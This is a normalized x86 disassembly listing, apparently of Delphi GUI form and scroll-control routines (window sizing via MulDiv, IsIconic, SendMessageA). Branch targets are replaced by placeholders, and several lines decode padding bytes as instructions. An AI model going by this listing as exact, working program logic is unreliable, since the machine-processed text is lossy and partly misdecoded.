mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_461068
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_460c00
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_461404
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b4f8
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_460880
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_460880
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46147c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403128
mov eax [ esi + 0x20c ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4614c8
push ebx
mov ebx eax
mov eax ebx
call sub_44c790
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_4616e0
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c02c
test al al
jne r-xdata
mov eax ebx
call sub_44f7d8
push eax
call sub_42d8b0
sub_461508
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_461660
mov ecx edi
mov edx esi
mov eax ebx
call sub_44bed8
pop edi
pop esi
pop ebx
retn
sub_461548
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_461650
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4489b0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_460b18
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_461068
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4185a4
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4486f4
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461657
mov eax [ ebp - 0x10 ]
call sub_403128
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_460960
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_418700
xor ecx ecx
mov edx 0xb03e
call sub_44a198
inc ebx
dec esi
jne r-xdata
sub_461684
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4611b8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4611b8
mov eax ebx
call sub_461660
jmp r-xdata
sub_4616e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44fadc
test al al
je r-xdata
xor eax eax
push ebp
push sub_4617cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_460c80
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_460c80
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_4612ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_4612ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_4612ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4612ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_4612ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4612ec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4617f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_448ac4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_448af0
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_448ac4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_448af0
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4489b0
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_461068
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4489b0
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4489f4
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_461068
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_4489b0
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_461068
mov eax ebx
call sub_4489b0
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4489f4
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4489f4
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_461068
mov eax ebx
call sub_4489f4
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_461944
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_461068
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_461068
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4611b8
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4611b8
sub_4619e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_461944
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f2e4
pop edi
pop esi
pop ebx
retn
sub_461a10
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_461a7a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ddc4
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461a81
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_461a81
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_461ab9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_461660
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ac0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_461ac0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4616e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_461b34
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4489f4
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42ba68
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4489b0
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42ba68
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_4170ec
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_44b844
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_461ba4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_461c05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4032b4
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44eb54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461c0c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_461c34
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_461d98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_461d78
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_403070
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461d7f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_461d40
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_418334
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403078
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
sub_461dc0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403324
and [ ebx + 0x2f4 ] 0xdf
sub_461df8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_461404
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_4486f4
xor edx edx
mov eax ebx
call sub_448718
mov edx 0x140
mov eax ebx
call sub_448740
mov edx 0xf0
mov eax ebx
call sub_448764
mov dl 0x1
mov eax [ r-xdata ]
call sub_42afac
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_462714
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_447b60
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403070
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_462a78
xor edx edx
mov eax ebx
call sub_449170
xor edx edx
mov eax ebx
call sub_4490d8
mov dl 0x1
mov eax ebx
call sub_44f918
mov edx ebx
mov eax [ rw-data ]
call sub_4670dc
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_461f71
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_420fd8
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_41889c
xor edx edx
mov eax ebx
call sub_41bdd0
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_465f84
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_461fdc
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034f4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_4620a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464900
mov eax [ ebp - 0x4 ]
call sub_44fadc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_467114
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403128
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d31c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_46147c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4620ad
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_4620c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_462101
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_462a78
sub_462106
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403324
test al al
jne r-xdata
call sub_403970
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_40391c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_462a78
sub_46213c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_46217d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46219c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44b0a0
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_464444
sub_4621d8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_448454
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_4185a4
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_46383c
mov edx esi
mov eax ebp
call sub_41889c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_463814
mov edx esi
mov eax edi
call sub_46383c
jmp r-xdata
xor edx edx
mov eax edi
call sub_4637f0
sub_4622e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c070
xor edx edx
push ebp
push sub_46253a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b7cc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4489c8
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_448a0c
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_46266c
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44a198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462541
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_461944
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44f29c
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_461944
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f29c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_42444c
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_424454
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_462549
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44cb18
push 0x0
push 0x0
push ebx
push sub_462650
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_46261c
push ebx
push sub_462634
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_4625fb
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c4c8
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4490d8
sub_462687
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_461944
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f29c
mov eax ebx
call sub_462770
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_4244f0
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_42450c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4489f4
mov ebp eax
push edi
push esi
mov eax ebx
call sub_4489b0
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_462a18
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_462a48
sub_462714
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_44f7d8
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_464a74
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
pop ebx
retn
